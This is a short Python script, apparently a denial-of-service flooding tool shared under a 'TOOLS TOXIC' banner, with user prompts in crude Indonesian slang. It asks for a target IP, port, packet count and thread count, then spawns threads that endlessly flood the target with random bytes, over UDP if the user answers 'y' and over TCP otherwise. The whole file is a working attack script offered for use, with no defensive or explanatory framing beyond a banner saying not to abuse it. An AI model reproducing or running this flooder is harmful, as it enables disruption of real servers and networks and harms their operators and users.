#Nathan_X_Makbul...
import random
import socket
import threading

print('''>>>>>>>>>>>>> ☠ TOOLS TOXIC ☠ <<<<<<<<<<<<<''')
print('''>>>>>>>>>>>>> TOOLS BY NATHAN X MAKBUL <<<<<<<<<<<<<''')
print('''>>>>>>>>>>>>> YANG RENAME GW ENTOD <<<<<<<<<<<<<''')
print('''>>>>>>>>>>>>> JANGAN ABUSE YA NJING <<<<<<<<<<<<<''')
print('''>>>>>>>>>>>>>>>> ☠☠☠ <<<<<<<<<<<<<<<<''')

ip = str(input("IP NYA MEK:"))
port = int(input("PORT NYA TOD:"))
times = int(input("PAKETNYA BERAPA NICHHH:"))
threads = int(input("BERAPA JUMLAH BARANGNYA ASU:"))
choice = str(input("GAS JEBOLIN GAK NIH ? (y or n):"))
def run():
	data = random._urandom(1025)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("MAKBUL NIH BOSS !!!")
		except:
			print("YAHAHHA HAYYUUUKKK!!!")

def run2():
	data = random._urandom(150)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("MAKBUL NIH BOSS !!!")
		except:
			s.close()
			print("YAHAHHA HAYYUUUKKK!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
